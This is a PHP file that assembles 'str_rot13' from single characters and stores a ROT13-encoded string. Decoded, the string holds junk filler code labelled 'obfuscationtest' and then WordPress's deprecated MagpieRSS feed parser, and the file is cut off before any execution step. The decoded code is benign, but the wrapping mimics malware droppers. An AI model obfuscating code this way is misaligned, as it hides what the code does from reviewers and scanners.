<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ZntcvrEFF: n fvzcyr EFF vagrtengvba gbby
 *
 * N pbzcvyrq svyr sbe EFF flaqvpngvba
 *
 * @nhgube Xryyna Ryyvbgg-ZpPern <xryyna@cebgrfg.arg>
 * @irefvba 0.51
 * @yvprafr TCY
 *
 * @cnpxntr Rkgreany
 * @fhocnpxntr ZntcvrEFF
 * @qrcerpngrq 3.0.0 Hfr FvzcyrCvr vafgrnq.
 */

/**
 * Qrcerpngrq. Hfr FvzcyrCvr (pynff-fvzcyrcvr.cuc) vafgrnq.
 */
_qrcerpngrq_svyr( onfranzr( __SVYR__ ), '3.0.0', JCVAP . '/pynff-fvzcyrcvr.cuc' );

/**
 * Sverf orsber ZntcvrEFF vf ybnqrq, gb bcgvbanyyl ercynpr vg.
 *
 * @fvapr 2.3.0
 * @qrcerpngrq 3.0.0
 */
qb_npgvba( 'ybnq_srrq_ratvar' );

/** EFF srrq pbafgnag. */
qrsvar('EFF', 'EFF');
qrsvar('NGBZ', 'Ngbz');
qrsvar('ZNTCVR_HFRE_NTRAG', 'JbeqCerff/' . $TYBONYF['jc_irefvba']);

pynff ZntcvrEFF {
	ine $cnefre;
	ine $pheerag_vgrz	= neenl();	// vgrz pheeragyl orvat cnefrq
	ine $vgrzf			= neenl();	// pbyyrpgvba bs cnefrq vgrzf
	ine $punaary		= neenl();	// unfu bs punaary svryqf
	ine $grkgvachg		= neenl();
	ine $vzntr			= neenl();
	ine $srrq_glcr;
	ine $srrq_irefvba;

	// cnefre inevnoyrf
	ine $fgnpx				= neenl(); // cnefre fgnpx
	ine $vapunaary			= snyfr;
	ine $vavgrz 			= snyfr;
	ine $vapbagrag			= snyfr; // vs va Ngbz <pbagrag zbqr=\"kzy\"> svryq
	ine $vagrkgvachg		= snyfr;
	ine $vavzntr 			= snyfr;
	ine $pheerag_svryq		= '';
	ine $pheerag_anzrfcnpr	= snyfr;

	//ine $REEBE = \"\";

	ine $_PBAGRAG_PBAFGEHPGF = neenl('pbagrag', 'fhzznel', 'vasb', 'gvgyr', 'gntyvar', 'pbclevtug');

	/**
	 * CUC5 pbafgehpgbe.
	 */
	shapgvba __pbafgehpg( $fbhepr ) {

		# Purpx vs CUC kzy vfa'g pbzcvyrq
		#
		vs ( ! shapgvba_rkvfgf('kzy_cnefre_perngr') ) {
			jc_gevttre_reebe( '', \"CUC'f KZY rkgrafvba vf abg ninvynoyr. Cyrnfr pbagnpg lbhe ubfgvat cebivqre gb ranoyr CUC'f KZY rkgrafvba.\" );
			erghea;
		}

		$cnefre = kzy_cnefre_perngr();

		$guvf->cnefre = $cnefre;

		# cnff va cnefre, naq n ersrerapr gb guvf bowrpg
		# frg hc unaqyref
		#
		kzy_frg_ryrzrag_unaqyre($guvf->cnefre,
				neenl( $guvf, 'srrq_fgneg_ryrzrag' ), neenl( $guvf, 'srrq_raq_ryrzrag' ) );

		kzy_frg_punenpgre_qngn_unaqyre( $guvf->cnefre, neenl( $guvf, 'srrq_pqngn' ) );

		$fgnghf = kzy_cnefr( $guvf->cnefre, $fbhepr );

		vs (! $fgnghf ) {
			$reebepbqr = kzy_trg_reebe_pbqr( $guvf->cnefre );
			vs ( $reebepbqr != KZY_REEBE_ABAR ) {
				$kzy_reebe = kzy_reebe_fgevat( $reebepbqr );
				$reebe_yvar = kzy_trg_pheerag_yvar_ahzore($guvf->cnefre);
				$reebe_pby = kzy_trg_pheerag_pbyhza_ahzore($guvf->cnefre);
				$reebezft = \"$kzy_reebe ng yvar $reebe_yvar, pbyhza $reebe_pby\";

				$guvf->reebe( $reebezft );
			}
		}

		kzy_cnefre_serr( $guvf->cnefre );
		hafrg( $guvf->cnefre );

		$guvf->abeznyvmr();
	}

	/**
	 * CUC4 pbafgehpgbe.
	 */
	choyvp shapgvba ZntcvrEFF( $fbhepr ) {
		frys::__pbafgehpg( $fbhepr );
	}

	shapgvba srrq_fgneg_ryrzrag($c, $ryrzrag, &$nggef) {
		$ry = $ryrzrag = fgegbybjre($ryrzrag);
		$nggef = neenl_punatr_xrl_pnfr($nggef, PNFR_YBJRE);

		// purpx sbe n anzrfcnpr, naq fcyvg vs sbhaq
		$af	= snyfr;
		vs ( fgecbf( $ryrzrag, ':' ) ) {
			yvfg($af, $ry) = rkcybqr( ':', $ryrzrag, 2);
		}
		vs ( $af naq $af != 'eqs' ) {
			$guvf->pheerag_anzrfcnpr = $af;
		}

		# vs srrq glcr vfa'g frg, gura guvf vf svefg ryrzrag bs srrq
		# vqragvsl srrq sebz ebbg ryrzrag
		#
		vs (!vffrg($guvf->srrq_glcr) ) {
			vs ( $ry == 'eqs' ) {
				$guvf->srrq_glcr = EFF;
				$guvf->srrq_irefvba = '1.0';
			}
			ryfrvs ( $ry == 'eff' ) {
				$guvf->srrq_glcr = EFF;
				$guvf->srrq_irefvba = $nggef['irefvba'];
			}
			ryfrvs ( $ry == 'srrq' ) {
				$guvf->srrq_glcr = NGBZ;
				$guvf->srrq_irefvba = $nggef['irefvba'];
				$guvf->vapunaary = gehr;
			}
			erghea;
		}

		vs ( $ry == 'punaary' )
		{
			$guvf->vapunaary = gehr;
		}
		ryfrvs ($ry == 'vgrz' be $ry == 'ragel' )
		{
			$guvf->vavgrz = gehr;
			vs ( vffrg($nggef['eqs:nobhg']) ) {
				$guvf->pheerag_vgrz['nobhg'] = $nggef['eqs:nobhg'];
			}
		}

		// vs jr'er va gur qrsnhyg anzrfcnpr bs na EFF srrq,
		//  erpbeq grkgvachg be vzntr svryqf
		ryfrvs (
			$guvf->srrq_glcr == EFF naq
			$guvf->pheerag_anzrfcnpr == '' naq
			$ry == 'grkgvachg' )
		{
			$guvf->vagrkgvachg = gehr;
		}

		ryfrvs (
			$guvf->srrq_glcr == EFF naq
			$guvf->pheerag_anzrfcnpr == '' naq
			$ry == 'vzntr' )
		{
			$guvf->vavzntr = gehr;
		}

		# unaqyr ngbz pbagrag pbafgehpgf
		ryfrvs ( $guvf->srrq_glcr == NGBZ naq va_neenl($ry, $guvf->_PBAGRAG_PBAFGEHPGF) )
		{
			// nibvq pynfuvat j/ EFF zbq_pbagrag
			vs ($ry == 'pbagrag' ) {
				$ry = 'ngbz_pbagrag';
			}

			$guvf->vapbagrag = $ry;

		}

		// vs vafvqr na Ngbz pbagrag pbafgehpg (r.t. pbagrag be fhzznel) svryq gerng gntf nf grkg
		ryfrvs ($guvf->srrq_glcr == NGBZ naq $guvf->vapbagrag )
		{
			// vs gntf ner vayvarq, gura synggra
			$nggef_fge = wbva(' ',
					neenl_znc(neenl('ZntcvrEFF', 'znc_nggef'),
					neenl_xrlf($nggef),
					neenl_inyhrf($nggef) ) );

			$guvf->nccraq_pbagrag( \"<$ryrzrag $nggef_fge>\"  );

			neenl_hafuvsg( $guvf->fgnpx, $ry );
		}

		// Ngbz fhccbeg znal yvaxf cre pbagnvavat ryrzrag.
		// Zntcvr gerngf yvax ryrzragf bs glcr ery='nygreangr'
		// nf orvat rdhvinyrag gb EFF'f fvzcyr yvax ryrzrag.
		//
		ryfrvs ($guvf->srrq_glcr == NGBZ naq $ry == 'yvax' )
		{
			vs ( vffrg($nggef['ery']) naq $nggef['ery'] == 'nygreangr' )
			{
				$yvax_ry = 'yvax';
			}
			ryfr {
				$yvax_ry = 'yvax_' . $nggef['ery'];
			}

			$guvf->nccraq($yvax_ry, $nggef['uers']);
		}
		// frg fgnpx[0] gb pheerag ryrzrag
		ryfr {
			neenl_hafuvsg($guvf->fgnpx, $ry);
		}
	}

	shapgvba srrq_pqngn ($c, $grkg) {

		vs ($guvf->srrq_glcr == NGBZ naq $guvf->vapbagrag)
		{
			$guvf->nccraq_pbagrag( $grkg );
		}
		ryfr {
			$pheerag_ry = wbva('_', neenl_erirefr($guvf->fgnpx));
			$guvf->nccraq($pheerag_ry, $grkg);
		}
	}

	shapgvba srrq_raq_ryrzrag ($c, $ry) {
		$ry = fgegbybjre($ry);

		vs ( $ry == 'vgrz' be $ry == 'ragel' )
		{
			$guvf->vgrzf[] = $guvf->pheerag_vgrz;
			$guvf->pheerag_vgrz = neenl();
			$guvf->vavgrz = snyfr;
		}
		ryfrvs ($guvf->srrq_glcr == EFF naq $guvf->pheerag_anzrfcnpr == '' naq $ry == 'grkgvachg' )
		{
			$guvf->vagrkgvachg = snyfr;
		}
		ryfrvs ($guvf->srrq_glcr == EFF naq $guvf->pheerag_anzrfcnpr == '' naq $ry == 'vzntr' )
		{
			$guvf->vavzntr = snyfr;
		}
		ryfrvs ($guvf->srrq_glcr == NGBZ naq va_neenl($ry, $guvf->_PBAGRAG_PBAFGEHPGF) )
		{
			$guvf->vapbagrag = snyfr;
		}
		ryfrvs ($ry == 'punaary' be $ry == 'srrq' )
		{
			$guvf->vapunaary = snyfr;
		}
		ryfrvs ($guvf->srrq_glcr == NGBZ naq $guvf->vapbagrag  ) {
			// onynapr gntf cebcreyl
			// abgr: Guvf znl abg npghnyyl or arprffnel
			vs ( $guvf->fgnpx[0] == $ry )
			{
				$guvf->nccraq_pbagrag(\"</$ry>\");
			}
			ryfr {
				$guvf->nccraq_pbagrag(\"<$ry />\");
			}

			neenl_fuvsg( $guvf->fgnpx );
		}
		ryfr {
			neenl_fuvsg( $guvf->fgnpx );
		}

		$guvf->pheerag_anzrfcnpr = snyfr;
	}

	shapgvba pbapng (&$fge1, $fge2=\"\") {
		vs (!vffrg($fge1) ) {
			$fge1=\"\";
		}
		$fge1 .= $fge2;
	}

	shapgvba nccraq_pbagrag($grkg) {
		vs ( $guvf->vavgrz ) {
			$guvf->pbapng( $guvf->pheerag_vgrz[ $guvf->vapbagrag ], $grkg );
		}
		ryfrvs ( $guvf->vapunaary ) {
			$guvf->pbapng( $guvf->punaary[ $guvf->vapbagrag ], $grkg );
		}
	}

	// fzneg nccraq - svryq naq anzrfcnpr njner
	shapgvba nccraq($ry, $grkg) {
		vs (!$ry) {
			erghea;
		}
		vs ( $guvf->pheerag_anzrfcnpr )
		{
			vs ( $guvf->vavgrz ) {
				$guvf->pbapng(
					$guvf->pheerag_vgrz[ $guvf->pheerag_anzrfcnpr ][ $ry ], $grkg);
			}
			ryfrvs ($guvf->vapunaary) {
				$guvf->pbapng(
					$guvf->punaary[ $guvf->pheerag_anzrfcnpr][ $ry ], $grkg );
			}
			ryfrvs ($guvf->vagrkgvachg) {
				$guvf->pbapng(
					$guvf->grkgvachg[ $guvf->pheerag_anzrfcnpr][ $ry ], $grkg );
			}
			ryfrvs ($guvf->vavzntr) {
				$guvf->pbapng(
					$guvf->vzntr[ $guvf->pheerag_anzrfcnpr ][ $ry ], $grkg );
			}
		}
		ryfr {
			vs ( $guvf->vavgrz ) {
				$guvf->pbapng(
					$guvf->pheerag_vgrz[ $ry ], $grkg);
			}
			ryfrvs ($guvf->vagrkgvachg) {
				$guvf->pbapng(
					$guvf->grkgvachg[ $ry ], $grkg );
			}
			ryfrvs ($guvf->vavzntr) {
				$guvf->pbapng(
					$guvf->vzntr[ $ry ], $grkg );
			}
			ryfrvs ($guvf->vapunaary) {
				$guvf->pbapng(
					$guvf->punaary[ $ry ], $grkg );
			}

		}
	}

	shapgvba abeznyvmr () {
		// vs ngbz cbchyngr eff svryqf
		vs ( $guvf->vf_ngbz() ) {
			$guvf->punaary['qrfpevcgvba'] = $guvf->punaary['gntyvar'];
			sbe ( $v = 0; $v < pbhag($guvf->vgrzf); $v++) {
				$vgrz = $guvf->vgrzf[$v];
				vs ( vffrg($vgrz['fhzznel']) )
					$vgrz['qrfpevcgvba'] = $vgrz['fhzznel'];
				vs ( vffrg($vgrz['ngbz_pbagrag']))
					$vgrz['pbagrag']['rapbqrq'] = $vgrz['ngbz_pbagrag'];

				$guvf->vgrzf[$v] = $vgrz;
			}
		}
		ryfrvs ( $guvf->vf_eff() ) {
			$guvf->punaary['gntyvar'] = $guvf->punaary['qrfpevcgvba'];
			sbe ( $v = 0; $v < pbhag($guvf->vgrzf); $v++) {
				$vgrz = $guvf->vgrzf[$v];
				vs ( vffrg($vgrz['qrfpevcgvba']))
					$vgrz['fhzznel'] = $vgrz['qrfpevcgvba'];
				vs ( vffrg($vgrz['pbagrag']['rapbqrq'] ) )
					$vgrz['ngbz_pbagrag'] = $vgrz['pbagrag']['rapbqrq'];

				$guvf->vgrzf[$v] = $vgrz;
			}
		}
	}

	shapgvba vf_eff () {
		vs ( $guvf->srrq_glcr == EFF ) {
			erghea $guvf->srrq_irefvba;
		}
		ryfr {
			erghea snyfr;
		}
	}

	shapgvba vf_ngbz() {
		vs ( $guvf->srrq_glcr == NGBZ ) {
			erghea $guvf->srrq_irefvba;
		}
		ryfr {
			erghea snyfr;
		}
	}

	shapgvba znc_nggef($x, $i) {
		erghea \"$x=\\"$i\\"\";
	}

	shapgvba reebe( $reebezft, $yiy = R_HFRE_JNEAVAT ) {
		vs ( ZNTCVR_QROHT ) {
			jc_gevttre_reebe('', $reebezft, $yiy);
		} ryfr {
			reebe_ybt( $reebezft, 0);
		}
	}

}

vs ( !shapgvba_rkvfgf('srgpu_eff') ) :
/**
 * Ohvyq Zntcvr bowrpg onfrq ba EFF sebz HEY.
 *
 * @fvapr 1.5.0
 * @cnpxntr Rkgreany
 * @fhocnpxntr ZntcvrEFF
 *
 * @cnenz fgevat $hey HEY gb ergevrir srrq.
 * @erghea ZntcvrEFF|snyfr ZntcvrEFF bowrpg ba fhpprff, snyfr ba snvyher.
 */
shapgvba srgpu_eff ($hey) {
	// vavgvnyvmr pbafgnagf
	vavg();

	vs ( !vffrg($hey) ) {
		// reebe(\"srgpu_eff pnyyrq jvgubhg n hey\");
		erghea snyfr;
	}

	// vs pnpur vf qvfnoyrq
	vs ( !ZNTCVR_PNPUR_BA ) {
		// srgpu svyr, naq cnefr vg
		$erfc = _srgpu_erzbgr_svyr( $hey );
		vs ( vf_fhpprff( $erfc->fgnghf ) ) {
			erghea _erfcbafr_gb_eff( $erfc );
		}
		ryfr {
			// reebe(\"Snvyrq gb srgpu $hey naq pnpur vf bss\");
			erghea snyfr;
		}
	}
	// ryfr pnpur vf BA
	ryfr {
		// Sybj
		// 1. purpx pnpur
		// 2. vs gurer vf n uvg, znxr fher vg'f serfu
		// 3. vs pnpurq bow snvyf serfuarff purpx, srgpu erzbgr
		// 4. vs erzbgr snvyf, erghea fgnyr bowrpg, be reebe

		$pnpur = arj EFFPnpur( ZNTCVR_PNPUR_QVE, ZNTCVR_PNPUR_NTR );

		vs (ZNTCVR_QROHT naq $pnpur->REEBE) {
			qroht($pnpur->REEBE, R_HFRE_JNEAVAT);
		}

		$pnpur_fgnghf 	 = 0;		// erfcbafr bs purpx_pnpur
		$erdhrfg_urnqref = neenl(); // UGGC urnqref gb fraq jvgu srgpu
		$eff 			 = 0;		// cnefrq EFF bowrpg
		$reebezft		 = 0;		// reebef, vs nal

		vs (!$pnpur->REEBE) {
			// erghea pnpur UVG, ZVFF, be FGNYR
			$pnpur_fgnghf = $pnpur->purpx_pnpur( $hey );
		}

		// vs bowrpg pnpurq, naq pnpur vf serfu, erghea pnpurq bow
		vs ( $pnpur_fgnghf == 'UVG' ) {
			$eff = $pnpur->trg( $hey );
			vs ( vffrg($eff) naq $eff ) {
				$eff->sebz_pnpur = 1;
				vs ( ZNTCVR_QROHT > 1) {
				qroht(\"ZntcvrEFF: Pnpur UVG\", R_HFRE_ABGVPR);
			}
				erghea $eff;
			}
		}

		// ryfr nggrzcg n pbaqvgvbany trg

		// frg hc urnqref
		vs ( $pnpur_fgnghf == 'FGNYR' ) {
			$eff = $pnpur->trg( $hey );
			vs ( vffrg($eff->rgnt) naq $eff->ynfg_zbqvsvrq ) {
				$erdhrfg_urnqref['Vs-Abar-Zngpu'] = $eff->rgnt;
				$erdhrfg_urnqref['Vs-Ynfg-Zbqvsvrq'] = $eff->ynfg_zbqvsvrq;
			}
		}

		$erfc = _srgpu_erzbgr_svyr( $hey, $erdhrfg_urnqref );

		vs (vffrg($erfc) naq $erfc) {
			vs ($erfc->fgnghf == '304' ) {
				// jr unir gur zbfg pheerag pbcl
				vs ( ZNTCVR_QROHT > 1) {
					qroht(\"Tbg 304 sbe $hey\");
				}
				// erfrg pnpur ba 304 (ng zvahgvyyb vafvfgrag cebqqvat)
				$pnpur->frg($hey, $eff);
				erghea $eff;
			}
			ryfrvs ( vf_fhpprff( $erfc->fgnghf ) ) {
				$eff = _erfcbafr_gb_eff( $erfc );
				vs ( $eff ) {
					vs (ZNTCVR_QROHT > 1) {
						qroht(\"Srgpu fhpprffshy\");
					}
					// nqq bowrpg gb pnpur
					$pnpur->frg( $hey, $eff );
					erghea $eff;
				}
			}
			ryfr {
				$reebezft = \"Snvyrq gb srgpu $hey. \";
				vs ( $erfc->reebe ) {
					# pbzcrafngr sbe Fabbcl'f naablvat unovg gb gnpxvat
					# ba '\a'
					$uggc_reebe = fhofge($erfc->reebe, 0, -2);
					$reebezft .= \"(UGGC Reebe: $uggc_reebe)\";
				}
				ryfr {
					$reebezft .=  \"(UGGC Erfcbafr: \" . $erfc->erfcbafr_pbqr .')';
				}
			}
		}
		ryfr {
			$reebezft = \"Hanoyr gb ergevrir EFF svyr sbe haxabja ernfbaf.\";
		}

		// ryfr srgpu snvyrq

		// nggrzcg gb erghea pnpurq bowrpg
		vs ($eff) {
			vs ( ZNTCVR_QROHT ) {
				qroht(\"Ergheavat FGNYR bowrpg sbe $hey\");
			}
			erghea $eff;
		}

		// ryfr jr gbgnyyl snvyrq
		// reebe( $reebezft );

		erghea snyfr;

	} // raq vs ( !ZNTCVR_PNPUR_BA ) {
} // raq srgpu_eff()
raqvs;

/**
 * Ergevrir HEY urnqref naq pbagrag hfvat JC UGGC Erdhrfg NCV.
 *
 * @fvapr 1.5.0
 * @cnpxntr Rkgreany
 * @fhocnpxntr ZntcvrEFF
 *
 * @cnenz fgevat $hey HEY gb ergevrir
 * @cnenz neenl $urnqref Bcgvbany. Urnqref gb fraq gb gur HEY. Qrsnhyg rzcgl fgevat.
 * @erghea Fabbcl fglyr erfcbafr
 */
shapgvba _srgpu_erzbgr_svyr($hey, $urnqref = \"\" ) {
	$erfc = jc_fnsr_erzbgr_erdhrfg( $hey, neenl( 'urnqref' => $urnqref, 'gvzrbhg' => ZNTCVR_SRGPU_GVZR_BHG ) );
	vs ( vf_jc_reebe($erfc) ) {
		$reebe = neenl_fuvsg($erfc->reebef);

		$erfc = arj fgqPynff;
		$erfc->fgnghf = 500;
		$erfc->erfcbafr_pbqr = 500;
		$erfc->reebe = $reebe[0] . \"\a\"; //\a = Fabbcl pbzcngvovyvgl
		erghea $erfc;
	}

	// Fabbcl ergheaf urnqref hacebprffrq.
	// Nyfb abgr, JC_UGGC ybjrepnfrf nyy xrlf, Fabbcl qvq abg.
	$erghea_urnqref = neenl();
	sbernpu ( jc_erzbgr_ergevrir_urnqref( $erfc ) nf $xrl => $inyhr ) {
		vs ( !vf_neenl($inyhr) ) {
			$erghea_urnqref[] = \"$xrl: $inyhr\";
		} ryfr {
			sbernpu ( $inyhr nf $i )
				$erghea_urnqref[] = \"$xrl: $i\";
		}
	}

	$erfcbafr = arj fgqPynff;
	$erfcbafr->fgnghf = jc_erzbgr_ergevrir_erfcbafr_pbqr( $erfc );
	$erfcbafr->erfcbafr_pbqr = jc_erzbgr_ergevrir_erfcbafr_pbqr( $erfc );
	$erfcbafr->urnqref = $erghea_urnqref;
	$erfcbafr->erfhygf = jc_erzbgr_ergevrir_obql( $erfc );

	erghea $erfcbafr;
}

/**
 * Ergevrir
 *
 * @fvapr 1.5.0
 * @cnpxntr Rkgreany
 * @fhocnpxntr ZntcvrEFF
 *
 * @cnenz neenl $erfc
 * @erghea ZntcvrEFF|obby
 */
shapgvba _erfcbafr_gb_eff ($erfc) {
	$eff = arj ZntcvrEFF( $erfc->erfhygf );

	// vs EFF cnefrq fhpprffshyyl
	vs ( $eff && (!vffrg($eff->REEBE) || !$eff->REEBE) ) {

		// svaq Rgnt, naq Ynfg-Zbqvsvrq
		sbernpu ( (neenl) $erfc->urnqref nf $u) {
			// 2003-03-02 - Avpbyn Nfhav (jjj.grpavpx.pbz) - svkrq oht \"Haqrsvarq bssfrg: 1\"
			vs (fgecbf($u, \": \")) {
				yvfg($svryq, $iny) = rkcybqr(\": \", $u, 2);
			}
			ryfr {
				$svryq = $u;
				$iny = \"\";
			}

			vs ( $svryq == 'rgnt' ) {
				$eff->rgnt = $iny;
			}

			vs ( $svryq == 'ynfg-zbqvsvrq' ) {
				$eff->ynfg_zbqvsvrq = $iny;
			}
		}

		erghea $eff;
	} // ryfr pbafgehpg reebe zrffntr
	ryfr {
		$reebezft = \"Snvyrq gb cnefr EFF svyr.\";

		vs ($eff) {
			$reebezft .= \" (\" . $eff->REEBE . \")\";
		}
		// reebe($reebezft);

		erghea snyfr;
	} // raq vs ($eff naq !$eff->reebe)
}

/**
 * Frg hc pbafgnagf jvgu qrsnhyg inyhrf, hayrff hfre bireevqrf.
 *
 * @fvapr 1.5.0
 * 
 * @tybony fgevat $jc_irefvba Gur JbeqCerff irefvba fgevat.
 * 
 * @cnpxntr Rkgreany
 * @fhocnpxntr ZntcvrEFF
 */
shapgvba vavg () {
	vs ( qrsvarq('ZNTCVR_VAVGNYVMRQ') ) {
		erghea;
	}
	ryfr {
		qrsvar('ZNTCVR_VAVGNYVMRQ', 1);
	}

	vs ( !qrsvarq('ZNTCVR_PNPUR_BA') ) {
		qrsvar('ZNTCVR_PNPUR_BA', 1);
	}

	vs ( !qrsvarq('ZNTCVR_PNPUR_QVE') ) {
		qrsvar('ZNTCVR_PNPUR_QVE', './pnpur');
	}

	vs ( !qrsvarq('ZNTCVR_PNPUR_NTR') ) {
		qrsvar('ZNTCVR_PNPUR_NTR', 60*60); // bar ubhe
	}

	vs ( !qrsvarq('ZNTCVR_PNPUR_SERFU_BAYL') ) {
		qrsvar('ZNTCVR_PNPUR_SERFU_BAYL', 0);
	}

		vs ( !qrsvarq('ZNTCVR_QROHT') ) {
		qrsvar('ZNTCVR_QROHT', 0);
	}

	vs ( !qrsvarq('ZNTCVR_HFRE_NTRAG') ) {
		$hn = 'JbeqCerff/' . $TYBONYF['jc_irefvba'];

		vs ( ZNTCVR_PNPUR_BA ) {
			$hn = $hn . ')';
		}
		ryfr {
			$hn = $hn . '; Ab pnpur)';
		}

		qrsvar('ZNTCVR_HFRE_NTRAG', $hn);
	}

	vs ( !qrsvarq('ZNTCVR_SRGPU_GVZR_BHG') ) {
		qrsvar('ZNTCVR_SRGPU_GVZR_BHG', 2);	// 2 frpbaq gvzrbhg
	}

	// hfr tmvc rapbqvat gb srgpu eff svyrf vs fhccbegrq?
	vs ( !qrsvarq('ZNTCVR_HFR_TMVC') ) {
		qrsvar('ZNTCVR_HFR_TMVC', gehr);
	}
}

shapgvba vf_vasb ($fp) {
	erghea $fp >= 100 && $fp < 200;
}

shapgvba vf_fhpprff ($fp) {
	erghea $fp >= 200 && $fp < 300;
}

shapgvba vf_erqverpg ($fp) {
	erghea $fp >= 300 && $fp < 400;
}

shapgvba vf_reebe ($fp) {
	erghea $fp >= 400 && $fp < 600;
}

shapgvba vf_pyvrag_reebe ($fp) {
	erghea $fp >= 400 && $fp < 500;
}

shapgvba vf_freire_reebe ($fp) {
	erghea $fp >= 500 && $fp < 600;
}

pynff EFFPnpur {
	ine $ONFR_PNPUR;	// jurer gur pnpur svyrf ner fgberq
	ine $ZNK_NTR	= 43200;  		// jura ner svyrf fgnyr, qrsnhyg gjryir ubhef
	ine $REEBE 		= '';			// npphzhyngr reebe zrffntrf

	/**
	 * CUC5 pbafgehpgbe.
	 */
	shapgvba __pbafgehpg( $onfr = '', $ntr = '' ) {
		$guvf->ONFR_PNPUR = JC_PBAGRAG_QVE . '/pnpur';
		vs ( $onfr ) {
			$guvf->ONFR_PNPUR = $onfr;
		}
		vs ( $ntr ) {
			$guvf->ZNK_NTR = $ntr;
		}

	}

	/**
	 * CUC4 pbafgehpgbe.
	 */
	choyvp shapgvba EFFPnpur( $onfr = '', $ntr = '' ) {
		frys::__pbafgehpg( $onfr, $ntr );
	}

/*=======================================================================*\
	Shapgvba:	frg
	Checbfr:	nqq na vgrz gb gur pnpur, xrlrq ba hey
	Vachg:		hey sebz juvpu gur eff svyr jnf srgpurq
	Bhgchg:		gehr ba fhpprff
\*=======================================================================*/
	shapgvba frg ($hey, $eff) {
		$pnpur_bcgvba = 'eff_' . $guvf->svyr_anzr( $hey );

		frg_genafvrag($pnpur_bcgvba, $eff, $guvf->ZNK_NTR);

		erghea $pnpur_bcgvba;
	}

/*=======================================================================*\
	Shapgvba:	trg
	Checbfr:	srgpu na vgrz sebz gur pnpur
	Vachg:		hey sebz juvpu gur eff svyr jnf srgpurq
	Bhgchg:		pnpurq bowrpg ba UVG, snyfr ba ZVFF
\*=======================================================================*/
	shapgvba trg ($hey) {
		$guvf->REEBE = \"\";
		$pnpur_bcgvba = 'eff_' . $guvf->svyr_anzr( $hey );

		vs ( ! $eff = trg_genafvrag( $pnpur_bcgvba ) ) {
			$guvf->qroht(
				\"Pnpur qbrf abg pbagnva: $hey (pnpur bcgvba: $pnpur_bcgvba)\"
			);
			erghea 0;
		}

		erghea $eff;
	}

/*=======================================================================*\
	Shapgvba:	purpx_pnpur
	Checbfr:	purpx n hey sbe zrzorefuvc va gur pnpur
				naq jurgure gur bowrpg vf byqre gura ZNK_NTR (vr. FGNYR)
	Vachg:		hey sebz juvpu gur eff svyr jnf srgpurq
	Bhgchg:		pnpurq bowrpg ba UVG, snyfr ba ZVFF
\*=======================================================================*/
	shapgvba purpx_pnpur ( $hey ) {
		$guvf->REEBE = \"\";
		$pnpur_bcgvba = 'eff_' . $guvf->svyr_anzr( $hey );

		vs ( trg_genafvrag($pnpur_bcgvba) ) {
			// bowrpg rkvfgf naq vf pheerag
				erghea 'UVG';
		} ryfr {
			// bowrpg qbrf abg rkvfg
			erghea 'ZVFF';
		}
	}

/*=======================================================================*\
	Shapgvba:	frevnyvmr
\*=======================================================================*/
	shapgvba frevnyvmr ( $eff ) {
		erghea frevnyvmr( $eff );
	}

/*=======================================================================*\
	Shapgvba:	hafrevnyvmr
\*=======================================================================*/
	shapgvba hafrevnyvmr ( $qngn ) {
		erghea hafrevnyvmr( $qngn );
	}

/*=======================================================================*\
	Shapgvba:	svyr_anzr
	Checbfr:	znc hey gb ybpngvba va pnpur
	Vachg:		hey sebz juvpu gur eff svyr jnf srgpurq
	Bhgchg:		n svyr anzr
\*=======================================================================*/
	shapgvba svyr_anzr ($hey) {
		erghea zq5( $hey );
	}

/*=======================================================================*\
	Shapgvba:	reebe
	Checbfr:	ertvfgre reebe
\*=======================================================================*/
	shapgvba reebe ($reebezft, $yiy=R_HFRE_JNEAVAT) {
		$guvf->REEBE = $reebezft;
		vs ( ZNTCVR_QROHT ) {
			jc_gevttre_reebe( '', $reebezft, $yiy);
		}
		ryfr {
			reebe_ybt( $reebezft, 0);
		}
	}
			shapgvba qroht ($qrohtzft, $yiy=R_HFRE_ABGVPR) {
		vs ( ZNTCVR_QROHT ) {
			$guvf->reebe(\"ZntcvrEFF [qroht] $qrohtzft\", $yiy);
		}
	}
}

vs ( !shapgvba_rkvfgf('cnefr_j3pqgs') ) :
shapgvba cnefr_j3pqgs ( $qngr_fge ) {

	# ertrk gb zngpu J3P qngr/gvzr sbezngf
	$cng = \"/(\q{4})-(\q{2})-(\q{2})G(\q{2}):(\q{2})(:(\q{2}))?(?:([-+])(\q{2}):?(\q{2})|(M))?/\";

	vs ( cert_zngpu( $cng, $qngr_fge, $zngpu ) ) {
		yvfg( $lrne, $zbagu, $qnl, $ubhef, $zvahgrf, $frpbaqf) =
			neenl( $zngpu[1], $zngpu[2], $zngpu[3], $zngpu[4], $zngpu[5], $zngpu[7]);

		# pnyp rcbpu sbe pheerag qngr nffhzvat TZG
		$rcbpu = tzzxgvzr( $ubhef, $zvahgrf, $frpbaqf, $zbagu, $qnl, $lrne);

		$bssfrg = 0;
		vs ( $zngpu[11] == 'M' ) {
			# mhyh gvzr, nxn TZG
		}
		ryfr {
			yvfg( $gm_zbq, $gm_ubhe, $gm_zva ) =
				neenl( $zngpu[8], $zngpu[9], $zngpu[10]);

			# mreb bhg gur inevnoyrf
			vs ( ! $gm_ubhe ) { $gm_ubhe = 0; }
			vs ( ! $gm_zva ) { $gm_zva = 0; }

			$bssfrg_frpf = (($gm_ubhe*60)+$gm_zva)*60;

			# vf gvzrmbar nurnq bs TZG?  gura fhogenpg bssfrg
			#
			vs ( $gm_zbq == '+' ) {
				$bssfrg_frpf = $bssfrg_frpf * -1;
			}

			$bssfrg = $bssfrg_frpf;
		}
		$rcbpu = $rcbpu + $bssfrg;
		erghea $rcbpu;
	}
	ryfr {
		erghea -1;
	}
}
raqvs;

vs ( !shapgvba_rkvfgf('jc_eff') ) :
/**
 * Qvfcynl nyy EFF vgrzf va n UGZY beqrerq yvfg.
 *
 * @fvapr 1.5.0
 * @cnpxntr Rkgreany
 * @fhocnpxntr ZntcvrEFF
 *
 * @cnenz fgevat $hey HEY bs srrq gb qvfcynl. Jvyy abg nhgb frafr srrq HEY.
